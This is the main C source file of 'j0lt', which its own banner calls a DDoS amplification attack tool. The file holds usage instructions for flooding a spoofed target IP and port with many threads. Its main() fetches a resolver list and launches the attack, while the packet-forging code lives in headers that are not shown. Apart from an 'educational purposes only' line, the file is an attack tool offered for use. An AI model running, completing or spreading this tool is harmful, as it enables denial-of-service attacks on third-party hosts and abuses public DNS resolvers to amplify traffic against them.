/**
 *      _________  .__   __
 *     |__\   _  \ |  |_/  |_
 *     |  /  /_\  \|  |\   __\
 *     |  \  \_/   \  |_|  |              @7etsuo
 * /\__|  |\_____  /____/__|       https://github.com/7etsuo
 * \______|      \/              ddos amplification attack tool
 * ------------------------------------------------------------
 *          ** For educational purposes only **
 * ------------------------------------------------------------
 * Usage: sudo ./j0lt -t <target> -p <port> -n <nthreads>
 * (7etsuo)-$ gcc j0lt.c -o j0lt
 * (7etsuo)-$ sudo ./j0lt -t 127.0.0.1 -p 80 -n 1337
 * ------------------------------------------------------------
 * Options:
 * [-x] will print a hexdump of the packet headers
 * [-d] puts j0lt into debug mode, no packets are sent
 * [-r list] will not fetch a resolv list, if one is provided.
 * ------------------------------------------------------------
 */

#include "io.h"               // Added for read_file_into_mem, readline, print_hex
#include "result.h"           // Added for Result_T
#include "process_control.h"  // Added for init_spawnattr, spawn_process, destroy_spawnattr
#include "opts.h"             // Added for JoltOptions, init_opts, parse_opts
#include "my_types.h"         // Added for GLOBAL_STRING_TYPE
#include "my_resolvlist.h"    // Added for wget_resolvlist_and_save_path
#include "j0lt_attack.h"      // Added for do_perform_attack

#include "j0lt.h"             // Added for JoltData, perform_attack
#include "j0lt_network.h"     // Added for forge_j0lt_packet

GLOBAL_STRING_TYPE GLOBAL_STRING_MENU = {
    " =========================================================\n"
    " Usage: sudo ./j0lt -t -p -n [OPTION]...                  \n"
    " -t <target>                      : target IPv4 (spoof)   \n"
    " -p <port>                        : target port           \n"
    " -n <nthreads>                    : nthreads of attack    \n"
    " -x [hexdump]                     : print hexdump         \n"
    " -d [debug]                       : offline debug mode    \n"
    " =========================================================\n"
    "           7etsuo: https://github.com/7etsuo           \n"};

// [TODO] : use switch and create debug for Result_T

int main(int argc, char **argv) {
  printf("%s", GLOBAL_STRING_MENU);

  JoltOptions opts;
  JoltData data;

  CHECK_SUCCESS(parse_opts(&opts, argc, (const char **)argv),
                "* parse_opts error");

  CHECK_SUCCESS(do_get_revoler_list(&data), "* do_get_revoler_list error");

  CHECK_SUCCESS(do_perform_attack(&data, &opts), "* do_perform_attack error");

  return 0;
}
